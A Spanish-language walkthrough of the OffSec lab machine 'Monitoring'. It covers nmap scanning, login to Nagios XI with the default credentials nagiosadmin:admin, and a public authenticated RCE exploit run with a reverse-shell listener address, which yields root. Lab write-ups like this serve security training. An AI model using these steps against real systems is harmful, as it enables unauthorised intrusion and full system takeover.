---
description: '✍️ Autor: OffSec 🔍 Dificultad: Fácil'
---

# Monitoring

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.197.136
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap 192.168.197.136
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como se puede observar durante el escaneo, los siguientes puertos se encuentran abiertos:

* **Puerto 22**, correspondiente al servicio **SSH**.
* **Puerto 25**, correspondiente al servicio **SMTP**.
* **Puerto 80**, correspondiente al servicio **HTTP**.
* **Puerto 389**, correspondiente al servicio **LDAP**.
* **Puerto 443**, correspondiente al servicio **HTTPS**.

Dado que estos servicios están accesibles, se procederá a realizar un análisis más detallado sobre cada uno de ellos con el fin de identificar posibles vectores de ataque o configuraciones incorrectas.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,25,80,389,443 -v 192.168.197.136
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Comprobamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Es una página de Nagios XI y al dar a acceder se nos muestra el panel de Login. Tras buscar las contraseñas por defecto nos logueamos (nagiosadmin:admin).

{% embed url="https://bobcares.com/blog/nagios-reset-password-for-nagiosadmin/" %}

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisando la página encontramos una versión por lo que miramos a ver si tiene un exploit.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Sí tiene exploit por lo que lo ejecutamos y así conseguimos una ejecución remota de código.

{% embed url="https://www.rapid7.com/db/modules/exploit/linux/http/nagios_xi_mibs_authenticated_rce/" %}

{% @github-files/github-code-block url="https://github.com/hadrian3689/nagiosxi_5.6.6/blob/main/exploit.py" %}

Nos descargamos el exploit y lo ejecutamos.

```bash
python3 exploit.py -t http://192.168.197.136/ -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.157-lp 4444
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Mientras nos ponemos en escucha.

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

y sí somos **root**.

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
